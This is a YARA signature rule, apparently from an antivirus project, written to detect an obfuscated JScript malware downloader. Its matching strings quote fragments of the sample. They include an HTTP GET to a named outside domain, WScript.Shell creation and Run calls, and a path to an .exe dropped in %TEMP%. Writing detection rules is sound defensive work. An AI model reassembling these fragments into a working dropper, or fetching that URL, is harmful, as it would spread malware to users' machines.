rule sig_20160330_bb1ea75280a0907835635867b58a0fb6 {
  meta:
    description = "datamaliciousorder - file 20160330_bb1ea75280a0907835635867b58a0fb6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d02f4f059262e136ca109902b338915f9ba7788b65eff88750fccd4b34d8eb13"

  strings:
    $s1  = "_F0[_V](\"GET\", \"http://smartbs-cameroun.com/nc7sjd\", false);" fullword ascii
    $s2  = "var _H0 = function _Z() {return WScript[_L](\"WScript\"+\".Shell\");}(), _F = 11;" fullword ascii
    $s3  = "function _S(_BU, _XS){_I = _I * 1; return _BU - _XS;};" fullword ascii
    $s4  = "if (_F0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _ZF(){return _V0 + \"\";};" fullword ascii
    $s6  = "function _H() {return ((_VX == true) && (_VX == _AJ)) ? 1 : _I;};" fullword ascii
    $s7  = "function _N(_GS){_H0[\"Run\"](_GS, _I, _I);};" fullword ascii
    $s8  = "var _QR = new this[\"Date\"]();" fullword ascii
    $s9  = " while (_EW){" fullword ascii
    $s10 = "function _D(){return _L;};" fullword ascii
    $s11 = "function _DQ()" fullword ascii
    $s12 = "function _PV(){return 22;};" fullword ascii
    $s13 = "function _CH() {return _H0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"m20I3HbCa2VLF.ex\" + \"e\";};" fullword ascii
    $s14 = "function _P(_KM) {var _IF = (1, 2, 3, 4, 5, _KM); return _IF;};" fullword ascii
    $s15 = "return _S(_OY, _Q);" fullword ascii
    $s16 = "var _AJ = false;" fullword ascii
    $s17 = "_VX = true; " fullword ascii
    $s18 = "_AJ = true; " fullword ascii
    $s19 = "var _VX = false;" fullword ascii
    $s20 = "} catch(_FM){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}